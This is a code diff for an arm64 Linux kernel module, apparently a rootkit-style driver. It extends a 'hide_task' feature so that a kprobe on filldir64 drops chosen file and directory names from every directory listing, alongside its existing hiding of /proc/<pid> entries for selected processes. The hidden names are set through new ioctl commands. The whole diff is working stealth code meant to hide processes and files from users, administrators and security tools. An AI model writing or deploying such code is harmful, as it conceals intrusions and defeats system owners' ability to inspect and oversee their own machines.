@@ -22,11 +22,112 @@
 
 #define HT_NAME_BUF 12
 
+/* File-name hiding (B.1). Each slot holds up to HIDE_NAME_MAX-1 chars and
+ * matches on exact directory-entry name equality — cheap to test in the
+ * filldir64 pre-handler. Applies to every readdir path in the kernel. */
+#define HIDE_NAME_MAX 64u
+#define HIDE_NAME_SLOTS 16u
+struct hidden_name_entry {
+	u8 in_use;
+	u8 len;                /* strlen; 0 when in_use is clear */
+	char name[HIDE_NAME_MAX];
+};
+static struct hidden_name_entry hidden_names[HIDE_NAME_SLOTS];
+static DEFINE_RAW_SPINLOCK(hidden_names_lock);
+
 static pid_t hidden_pids[HIDE_TASK_MAX_SLOTS];
 static DEFINE_RAW_SPINLOCK(hidden_lock);
 static DEFINE_MUTEX(kp_lock);
 static struct kprobe filldir_kp;
 static bool kp_registered;
+
+/* Fast substring/eq check against hidden_names. Used from the filldir64
+ * pre-handler with IRQs disabled — must not sleep and must stay short. */
+static bool hidden_name_matches(const char *name, int namlen) {
+	unsigned long flags;
+	unsigned int i;
+	bool hit = false;
+
+	if (!name || namlen <= 0 || (unsigned int)namlen >= HIDE_NAME_MAX)
+		return false;
+
+	raw_spin_lock_irqsave(&hidden_names_lock, flags);
+	for (i = 0; i < HIDE_NAME_SLOTS; i++) {
+		const struct hidden_name_entry *e = &hidden_names[i];
+		if (!e->in_use || e->len != (u8)namlen)
+			continue;
+		if (memcmp(e->name, name, namlen) == 0) {
+			hit = true;
+			break;
+		}
+	}
+	raw_spin_unlock_irqrestore(&hidden_names_lock, flags);
+	return hit;
+}
+
+int hide_task_name_add(const char *name) {
+	unsigned long flags;
+	unsigned int i, free_slot = HIDE_NAME_SLOTS;
+	size_t len;
+
+	if (!name) return -EINVAL;
+	len = strnlen(name, HIDE_NAME_MAX);
+	if (len == 0 || len >= HIDE_NAME_MAX) return -EINVAL;
+
+	raw_spin_lock_irqsave(&hidden_names_lock, flags);
+	for (i = 0; i < HIDE_NAME_SLOTS; i++) {
+		if (hidden_names[i].in_use &&
+		    hidden_names[i].len == (u8)len &&
+		    memcmp(hidden_names[i].name, name, len) == 0) {
+			raw_spin_unlock_irqrestore(&hidden_names_lock, flags);
+			return 0;
+		}
+		if (!hidden_names[i].in_use && free_slot == HIDE_NAME_SLOTS)
+			free_slot = i;
+	}
+	if (free_slot == HIDE_NAME_SLOTS) {
+		raw_spin_unlock_irqrestore(&hidden_names_lock, flags);
+		return -ENOSPC;
+	}
+	hidden_names[free_slot].in_use = 1;
+	hidden_names[free_slot].len = (u8)len;
+	memcpy(hidden_names[free_slot].name, name, len);
+	hidden_names[free_slot].name[len] = 0;
+	raw_spin_unlock_irqrestore(&hidden_names_lock, flags);
+	LOGI("hide_task: add name=\"%s\" slot=%u\n", name, free_slot);
+	return 0;
+}
+
+int hide_task_name_remove(const char *name) {
+	unsigned long flags;
+	unsigned int i;
+	size_t len;
+	int rc = -ENOENT;
+
+	if (!name) return -EINVAL;
+	len = strnlen(name, HIDE_NAME_MAX);
+	if (len == 0 || len >= HIDE_NAME_MAX) return -EINVAL;
+
+	raw_spin_lock_irqsave(&hidden_names_lock, flags);
+	for (i = 0; i < HIDE_NAME_SLOTS; i++) {
+		if (hidden_names[i].in_use &&
+		    hidden_names[i].len == (u8)len &&
+		    memcmp(hidden_names[i].name, name, len) == 0) {
+			memset(&hidden_names[i], 0, sizeof(hidden_names[i]));
+			rc = 0;
+			break;
+		}
+	}
+	raw_spin_unlock_irqrestore(&hidden_names_lock, flags);
+	return rc;
+}
+
+void hide_task_name_clear(void) {
+	unsigned long flags;
+	raw_spin_lock_irqsave(&hidden_names_lock, flags);
+	memset(hidden_names, 0, sizeof(hidden_names));
+	raw_spin_unlock_irqrestore(&hidden_names_lock, flags);
+}
 
 /* Parse a proc-dir name as a positive decimal PID. Rejects empty, leading-zero, non-digit, or overflow. */
 static bool parse_pid_name(const char *name, int len, pid_t *out) {
@@ -60,7 +161,11 @@ bool hide_task_contains(pid_t pid) {
 	return hit;
 }
 
-/* filldir64(ctx, name, namlen, offset, ino, d_type) — x0..x5 on arm64. */
+/* filldir64(ctx, name, namlen, offset, ino, d_type) — x0..x5 on arm64.
+ * Two hide gates share the same probe:
+ *   1. DT_DIR + numeric name matching hidden_pids[] — /proc/<pid> hiding
+ *   2. any dirent (file OR dir) whose exact name is in hidden_names[] — B.1
+ *      file hiding; single hook covers ext4/f2fs/tmpfs/overlayfs/proc/sysfs. */
 static int filldir64_pre(struct kprobe *p, struct pt_regs *regs) {
 	const char *name;
 	int namlen;
@@ -70,17 +175,26 @@ static int filldir64_pre(struct kprobe *p, struct pt_regs *regs) {
 	(void)p;
 	if (!regs) return 0;
 
-	d_type = (unsigned int)regs->regs[5];
-	if (d_type != DT_DIR) return 0;
-
 	name = (const char *)regs->regs[1];
 	namlen = (int)regs->regs[2];
 	if (!name || namlen <= 0) return 0;
 
-	if (!parse_pid_name(name, namlen, &candidate)) return 0;
-	if (!hide_task_contains(candidate)) return 0;
+	d_type = (unsigned int)regs->regs[5];
 
-	/* Spoof: skip original, return 0/false (continue iteration without adding this entry). */
+	/* PID hide path — only directories matter (proc PID entries). */
+	if (d_type == DT_DIR &&
+	    parse_pid_name(name, namlen, &candidate) &&
+	    hide_task_contains(candidate))
+		goto spoof;
+
+	/* File/dir name hide path — any dirent. */
+	if (hidden_name_matches(name, namlen))
+		goto spoof;
+
+	return 0;
+
+spoof:
+	/* Skip original, return 0/false (continue iteration without adding). */
 	regs->regs[0] = 0;
 	instruction_pointer_set(regs, procedure_link_pointer(regs));
 	return 1;
@@ -180,6 +294,19 @@ int hide_task_list(pid_t *out, size_t max) {
 	return n;
 }
 
+/* Called from the file-name ioctls — copy up to HIDE_NAME_MAX-1 bytes from
+ * @arg.buf (already validated below) into a stack buffer, NUL-terminate, then
+ * dispatch to the requested op. */
+static long copy_and_hide_name(void __user *ubuf, u64 blen, int (*op)(const char *)) {
+	char name[HIDE_NAME_MAX];
+	if (!ubuf || blen == 0 || blen >= HIDE_NAME_MAX)
+		return -EINVAL;
+	if (copy_from_user(name, ubuf, blen) != 0)
+		return -EFAULT;
+	name[blen] = 0;
+	return op(name);
+}
+
 long do_hide_task_cmd(unsigned int cmd, void __user *arg) {
 	struct drv_ioctl_req req;
 	pid_t list[HIDE_TASK_MAX_SLOTS];
@@ -202,6 +329,13 @@ long do_hide_task_cmd(unsigned int cmd, void __user *arg) {
 			if (copy_to_user((void __user *)(uintptr_t)req.buf, list, n * sizeof(pid_t)) != 0) return -EFAULT;
 			req.size = (u64)n;
 			if (copy_to_user(arg, &req, sizeof(req)) != 0) return -EFAULT;
+			return 0;
+		case DRV_CMD_HIDE_NAME_ADD:
+			return copy_and_hide_name((void __user *)(uintptr_t)req.buf, req.size, hide_task_name_add);
+		case DRV_CMD_HIDE_NAME_REMOVE:
+			return copy_and_hide_name((void __user *)(uintptr_t)req.buf, req.size, hide_task_name_remove);
+		case DRV_CMD_HIDE_NAME_CLEAR:
+			hide_task_name_clear();
 			return 0;
 		default:
 			return -ENOTTY;
